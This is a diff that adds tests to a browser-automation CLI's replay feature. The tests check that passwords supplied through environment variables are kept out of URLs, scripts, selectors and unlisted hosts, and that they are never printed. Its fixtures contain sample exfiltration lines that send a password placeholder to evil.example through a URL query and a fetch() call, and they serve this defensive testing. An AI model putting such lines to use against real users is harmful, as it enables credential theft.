@@ -11857,6 +11857,235 @@ print(json.dumps(res))
     assert(r.stdout.includes('[2/2] block on ... ok'), 'step 2 must run with --continue');
   });
 
+  // ── replay and CDPILOT_VAR_<NAME> (2026-11-10 review) ──
+  // An environment value fills only the value of an input step (RECORD_INPUT_CMDS) on a
+  // host named in CDPILOT_VAR_HOSTS, checked live before the step; --var fills anything.
+  const PLANTED = 'zq-planted-value-7731';
+  function varEnv(home, extra = {}) {
+    const env = makeIsolatedEnv(home);
+    for (const k of Object.keys(env)) if (k.startsWith('CDPILOT_VAR_')) delete env[k];
+    delete env.CDPILOT_TARGET;
+    return { ...env, ...extra };
+  }
+  function writeFlow(home, steps) {
+    const p = path.join(home, 'var-flow.json');
+    fs.writeFileSync(p, JSON.stringify({ cdpilot_flow: 1, name: 'var', steps, vars: {} }));
+    return p;
+  }
+  function noSecret(r) {
+    assert(!r.stdout.includes(PLANTED), `stdout leaks the value: ${r.stdout}`);
+    assert(!r.stderr.includes(PLANTED), `stderr leaks the value: ${r.stderr}`);
+  }
+  function errJson(r) {
+    const line = r.stderr.split('\n').reverse().find((l) => l.startsWith('{'));
+    assert(line, `no JSON error on stderr: ${r.stderr}`);
+    return JSON.parse(line);
+  }
+  // test/connect_fake_cdp.py: PAGE1 is https://user.example/inbox; Page.navigate moves the
+  // tab this socket is attached to, and /json reports the new URL.
+  function startFakeCdp() {
+    const { spawn } = require('child_process');
+    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'cdpilot-rep-fake-'));
+    const port = spawnSync(PYB, ['-c', 'import socket; s = socket.socket(); s.bind(("127.0.0.1", 0)); '
+      + 'print(s.getsockname()[1]); s.close()'], { encoding: 'utf-8', timeout: 10000 }).stdout.trim();
+    const log = path.join(dir, 'fake.jsonl');
+    const proc = spawn(PYB, [path.join(__dirname, 'connect_fake_cdp.py'), port, log, 'full', 'guid-rep'],
+      { stdio: 'ignore' });
+    for (let i = 0; i < 100 && !(fs.existsSync(log) && fs.readFileSync(log, 'utf-8').includes('"ready"')); i++) {
+      spawnSync(PYB, ['-c', 'import time; time.sleep(0.1)']);
+    }
+    if (!fs.existsSync(log)) { try { proc.kill('SIGKILL'); } catch {} throw new Error('fake CDP did not start'); }
+    return { port, log, stop: () => { try { proc.kill('SIGKILL'); } catch {} } };
+  }
+  function fakeEnv(home, port, extra = {}) {
+    return varEnv(home, { CDP_PORT: String(port), CDPILOT_PROJECT_ID: 'rep-var', CHROME_BIN: '/no/such/browser',
+      CDPILOT_TARGET: 'PAGE1', ...extra });
+  }
+
+  test('replay: env var — a CDPILOT_VAR value in a go URL exits 2 before any step runs', () => {
+    const home = fs.mkdtempSync(path.join(os.tmpdir(), 'cdpilot-rep-envgo-'));
+    const flowPath = writeFlow(home, [
+      { cmd: 'block', args: ['on'], t_ms: 0 },
+      { cmd: 'go', args: ['https://evil.example/?p={{password}}'], t_ms: 10 },
+    ]);
+    const r = runCli(['replay', flowPath, '--delay', 'none'],
+      varEnv(home, { CDPILOT_VAR_PASSWORD: PLANTED, CDPILOT_VAR_HOSTS: 'evil.example' }));
+    assert.strictEqual(r.status, 2, r.stderr);
+    assert(!/\[1\/2\]/.test(r.stdout), `no step may run: ${r.stdout}`);
+    const e = errJson(r);
+    assert.deepStrictEqual(e.missing, []);
+    assert.strictEqual(e.refused.length, 1);
+    assert.deepStrictEqual([e.refused[0].var, e.refused[0].step, e.refused[0].cmd], ['password', 2, 'go']);
+    assert(/never fills a URL; pass --var/.test(e.refused[0].why), e.refused[0].why);
+    noSecret(r);
+  });
+
+  test('replay: env var — a CDPILOT_VAR value in eval (or a selector / flag) exits 2', () => {
+    const home = fs.mkdtempSync(path.join(os.tmpdir(), 'cdpilot-rep-enveval-'));
+    const env = varEnv(home, { CDPILOT_VAR_PASSWORD: PLANTED, CDPILOT_VAR_HOSTS: 'example.com' });
+    let r = runCli(['replay', writeFlow(home, [
+      { cmd: 'eval', args: ["fetch('https://evil.example/?'+'{{password}}')"], t_ms: 0 }]), '--delay', 'none'], env);
+    assert.strictEqual(r.status, 2, r.stderr);
+    assert.strictEqual(r.stdout, '');
+    let e = errJson(r);
+    assert.strictEqual(e.refused[0].cmd, 'eval');
+    assert(/never fills a script/.test(e.refused[0].why), e.refused[0].why);
+    noSecret(r);
+    r = runCli(['replay', writeFlow(home, [
+      { cmd: 'fill', args: ['#{{password}}', 'x'], t_ms: 0 },
+      { cmd: 'fill', args: ['#pw', '--ladder={{password}}', 'x'], t_ms: 0 },
+      { cmd: 'block', args: ['{{password}}'], t_ms: 0 }]), '--delay', 'none'], env);
+    assert.strictEqual(r.status, 2, r.stderr);
+    assert.strictEqual(r.stdout, '');
+    e = errJson(r);
+    assert.deepStrictEqual(e.refused.map((x) => x.step), [1, 2, 3]);
+    assert(/selector or label/.test(e.refused[0].why), e.refused[0].why);
+    assert(/never fills a flag/.test(e.refused[1].why), e.refused[1].why);
+    assert(/only the value of an input step/.test(e.refused[2].why), e.refused[2].why);
+    noSecret(r);
+  });
+
+  test('replay: env var — fill with a CDPILOT_VAR value and CDPILOT_VAR_HOSTS unset exits 2', () => {
+    const home = fs.mkdtempSync(path.join(os.tmpdir(), 'cdpilot-rep-envnohosts-'));
+    const flowPath = writeFlow(home, [{ cmd: 'fill', args: ['#password', '{{password}}'], t_ms: 0 }]);
+    const r = runCli(['replay', flowPath, '--delay', 'none'], varEnv(home, { CDPILOT_VAR_PASSWORD: PLANTED }));
+    assert.strictEqual(r.status, 2, r.stderr);
+    assert.strictEqual(r.stdout, '');
+    const e = errJson(r);
+    assert(/environment value\(s\) refused: password/.test(e.error), e.error);
+    assert(/CDPILOT_VAR_HOSTS is empty/.test(e.refused[0].why), e.refused[0].why);
+    noSecret(r);
+  });
+
+  test('replay: env var — the value positions and refusal reasons per input command (helper)', () => {
+    const script = [
+      'import sys, json; sys.path.insert(0, "src")',
+      'from cdpilot import _replay_value_positions as vp, _replay_env_refusal as why',
+      'out = {',
+      ' "fill": sorted(vp("fill", ["--no-heal", "#a", "v1", "--ladder=x", "v2"])),',
+      ' "type": sorted(vp("type", ["#a", "v"])),',
+      ' "smart-fill": sorted(vp("smart-fill", ["Email", "a", "--b"])),',
+      ' "select": sorted(vp("select", ["#s", "opt"])),',
+      ' "assert-value": sorted(vp("assert-value", ["#a", "v", "extra"])),',
+      ' "go": sorted(vp("go", ["https://x/{{a}}"])),',
+      ' "ok": why("fill", 1, vp("fill", ["#a", "{{a}}"]), ["#a", "{{a}}"], ["example.com"]),',
+      ' "nohosts": why("fill", 1, vp("fill", ["#a", "{{a}}"]), ["#a", "{{a}}"], []),',
+      ' "run": why("run", 0, frozenset(), ["{{a}}.cdp"], ["example.com"]),',
+      ' "frame": why("fill", 1, vp("fill", ["iframe#x >>> input", "{{a}}"]), ["iframe#x >>> input", "{{a}}"], ["example.com"]),',
+      ' "frameflag": why("fill", 1, vp("fill", ["#a", "{{a}}", "--frame", "#f"]), ["#a", "{{a}}", "--frame", "#f"], ["example.com"]),',
+      '}',
+      'print(json.dumps(out))',
+    ].join('\n');
+    const out = JSON.parse(execFileSync(PYB, ['-c', script],
+      { cwd: path.join(__dirname, '..'), encoding: 'utf-8', timeout: 20000 }).trim());
+    assert.deepStrictEqual(out.fill, [2, 4]);
+    assert.deepStrictEqual(out.type, [1]);
+    assert.deepStrictEqual(out['smart-fill'], [1]);
+    assert.deepStrictEqual(out.select, [1]);
+    assert.deepStrictEqual(out['assert-value'], [1]);
+    assert.deepStrictEqual(out.go, []);
+    assert.strictEqual(out.ok, null);
+    assert(/CDPILOT_VAR_HOSTS is empty/.test(out.nohosts), out.nohosts);
+    assert(/only the value of an input step/.test(out.run), out.run);
+    assert(/routed into a frame/.test(out.frame), out.frame);
+    assert(/routed into a frame/.test(out.frameflag), out.frameflag);
+  });
+
+  test('replay: env var — live host not in CDPILOT_VAR_HOSTS refuses that step, value printed nowhere', () => {
+    const fake = startFakeCdp();
+    try {
+      const home = fs.mkdtempSync(path.join(os.tmpdir(), 'cdpilot-rep-envlive-'));
+      const flowPath = writeFlow(home, [
+        { cmd: 'go', args: ['https://evil.example/login'], t_ms: 0 },
+        { cmd: 'fill', args: ['#pw', '{{password}}'], t_ms: 10 },
+        { cmd: 'block', args: ['on'], t_ms: 20 },
+      ]);
+      const r = runCli(['replay', flowPath, '--delay', 'none', '--continue'],
+        fakeEnv(home, fake.port, { CDPILOT_VAR_PASSWORD: PLANTED, CDPILOT_VAR_HOSTS: 'example.com' }));
+      assert.strictEqual(r.status, 2, r.stdout + r.stderr);
+      assert(/\[1\/3\] go https:\/\/evil\.example\/login \.\.\. ok/.test(r.stdout), r.stdout);
+      assert(r.stdout.includes('[2/3] fill #pw ... refused'), r.stdout);
+      assert(!r.stdout.includes('[3/3]'), 'a refusal stops the replay, --continue or not');
+      const e = errJson(r);
+      assert.strictEqual(e.refused[0].step, 2);
+      assert(/active page is on evil\.example; CDPILOT_VAR_HOSTS does not name it/.test(e.refused[0].why),
+        e.refused[0].why);
+      noSecret(r);
+      assert(!fs.readFileSync(fake.log, 'utf-8').includes(PLANTED), 'the value never reached the browser');
+    } finally {
+      fake.stop();
+    }
+  });
+
+  test('replay: env var — the same flows run with --var (go URL, a non-input command, fill, no CDPILOT_VAR_HOSTS)', () => {
+    const fake = startFakeCdp();
+    try {
+      const home = fs.mkdtempSync(path.join(os.tmpdir(), 'cdpilot-rep-cliv-'));
+      const flowPath = writeFlow(home, [
+        { cmd: 'go', args: ['https://evil.example/?p={{password}}'], t_ms: 0 },
+        { cmd: 'block', args: ['on'], t_ms: 10 },
+        { cmd: 'fill', args: ['#pw', '{{password}}'], t_ms: 20 },
+      ]);
+      const r = runCli(['replay', flowPath, '--delay', 'none', '--var', `password=${PLANTED}`],
+        fakeEnv(home, fake.port, { CDPILOT_VAR_PASSWORD: 'env-value-unused' }));
+      assert(/\[1\/3\] go https:\/\/evil\.example\/\?p=\{\{password\}\} \.\.\. ok/.test(r.stdout), r.stdout + r.stderr);
+      assert(r.stdout.includes('[2/3] block on ... ok'), r.stdout);
+      assert(/\[3\/3\] fill #pw \.\.\. (ok|failed)/.test(r.stdout), r.stdout);
+      assert(!/refused/.test(r.stdout + r.stderr), r.stderr);
+      noSecret(r);
+      // --var reached the go URL (the fake's tab shows it), as before the rule.
+      const seen = spawnSync(PYB, ['-c', `import urllib.request,json; print(json.dumps([p["url"] for p in json.load(urllib.request.urlopen("http://127.0.0.1:${fake.port}/json"))]))`],
+        { encoding: 'utf-8', timeout: 10000 }).stdout;
+      assert(seen.includes(`https://evil.example/?p=${PLANTED}`), seen);
+    } finally {
+      fake.stop();
+    }
+  });
+
+  test('replay: env var — --dry-run settles the rule first and never prints a value', () => {
+    const home = fs.mkdtempSync(path.join(os.tmpdir(), 'cdpilot-rep-envdry-'));
+    const flowPath = writeFlow(home, [
+      { cmd: 'go', args: ['https://example.com/login'], t_ms: 0 },
+      { cmd: 'fill', args: ['#pw', '{{password}}'], t_ms: 10 },
+      { cmd: 'fill', args: ['#user', '{{user}}'], t_ms: 20 },
+    ]);
+    let r = runCli(['replay', flowPath, '--dry-run', '--var', 'user=zq-cli-user-99'],
+      varEnv(home, { CDPILOT_VAR_PASSWORD: PLANTED, CDPILOT_VAR_HOSTS: 'example.com' }));
+    assert.strictEqual(r.status, 0, r.stderr);
+    assert(r.stdout.includes('[2/3] fill #pw {{password}}'), r.stdout);
+    assert(r.stdout.includes('[3/3] fill #user {{user}}'), r.stdout);
+    assert(!(r.stdout + r.stderr).includes('zq-cli-user-99'), 'no --var value either');
+    noSecret(r);
+    // Without CDPILOT_VAR_HOSTS the dry run refuses like a real run, still naming no value.
+    r = runCli(['replay', flowPath, '--dry-run', '--var', 'user=zq-cli-user-99'],
+      varEnv(home, { CDPILOT_VAR_PASSWORD: PLANTED }));
+    assert.strictEqual(r.status, 2, r.stderr);
+    assert.strictEqual(r.stdout, '');
+    noSecret(r);
+  });
+
+  test('replay: env var — fill with a CDPILOT_VAR value on an allowed live host runs the step', () => {
+    const fake = startFakeCdp();
+    try {
+      const home = fs.mkdtempSync(path.join(os.tmpdir(), 'cdpilot-rep-envok-'));
+      const flowPath = writeFlow(home, [
+        { cmd: 'go', args: ['https://login.example.com/'], t_ms: 0 },
+        { cmd: 'fill', args: ['#pw', '{{password}}'], t_ms: 10 },
+      ]);
+      const r = runCli(['replay', flowPath, '--delay', 'none'],
+        fakeEnv(home, fake.port, { CDPILOT_VAR_PASSWORD: PLANTED, CDPILOT_VAR_HOSTS: 'example.com' }));
+      assert(r.stdout.includes('[1/2] go https://login.example.com/ ... ok'), r.stdout + r.stderr);
+      // The fake has no DOM, so the child `fill` may fail to resolve #pw; the point is that
+      // the host check passed (subdomain of a listed host) and the child ran.
+      assert(/\[2\/2\] fill #pw \.\.\. (ok|failed \(1\))/.test(r.stdout), r.stdout + r.stderr);
+      assert.notStrictEqual(r.status, 2, r.stderr);
+      assert(!/refused/.test(r.stdout + r.stderr), r.stderr);
+      noSecret(r);
+    } finally {
+      fake.stop();
+    }
+  });
+
   test('record & replay e2e: go -> fill -> record stop -> replay (gated by CDPILOT_E2E=1)', () => {
     if (process.env.CDPILOT_E2E !== '1') {
       console.log('  - skipped: record/replay e2e (set CDPILOT_E2E=1 to run it against a headless browser)');
